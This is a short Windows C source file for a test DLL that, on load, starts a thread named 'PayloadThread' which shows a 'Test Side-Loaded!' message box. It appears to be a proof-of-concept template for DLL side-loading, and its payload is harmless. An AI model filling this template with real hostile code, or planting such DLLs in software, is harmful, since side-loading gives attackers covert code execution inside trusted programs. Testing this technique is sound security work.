#include <windows.h>

DWORD WINAPI PayloadThread(LPVOID lpParam) {

    MessageBoxA(NULL, "Test Side-Loaded!", "Success!", MB_OK | MB_ICONEXCLAMATION);

    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CloseHandle(CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL));
        break;
    }
    return TRUE;
}